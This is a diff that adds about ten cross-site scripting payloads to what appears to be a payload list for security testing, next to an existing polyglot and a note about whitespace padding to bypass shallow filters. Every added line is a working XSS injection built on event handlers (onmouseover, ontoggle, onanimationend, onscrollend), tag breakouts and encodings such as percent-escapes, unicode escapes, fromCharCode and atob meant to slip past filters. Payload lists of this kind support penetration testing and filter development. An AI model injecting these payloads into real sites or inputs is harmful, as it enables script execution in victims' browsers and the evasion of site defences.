@@ -32,7 +32,19 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 
 *test start of payload with 10240 characters of whitespace to bypass shallow filters*
 
+<img src="" ><meter onmouseover=confirm(document.domain)><progress>
+<img src="" ><marquee loop=1 width=0 onfinish=confirm(1)>test</marquee>
+<img src="" ><me%74er onm%6fuseover=\u0061lert(document.domain)>
+<img src="" ><details open ontoggle=alert(atob('ZG9jdW1lbnQuZG9tYWlu'))>
+<img src="" ><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src="" ><style>@keyframes x{from{left:0;}to{left:1000px;}}:target{animation:10s ease-in-out 0s 1 x;}</style><a id=x href=# onanimationend=alert(1)>click</a>
+x%22%20aut%6Ff%6f%63us%20onf%6f%63us%3D\u0061lert%601%60
+<img src="%22%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E">
+" ><style>.scroll-container{overflow-x:scroll;scroll-snap-type:x mandatory;display:flex;width:300px;}.scroll-item{flex:0 0 500px;scroll-snap-align:start;}.scroll-item:first-child{animation:sample;animation-duration:0.1s;}@keyframes sample{100%{scroll-snap-align:none;}}</style><div class=scroll-container onscrollend=alert(1)><div class=scroll-item>test</div></div>
+<img src="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+confirm(1)//'">
+
 eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59)); 
 ');confirm();//
 ');eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));//
+
 
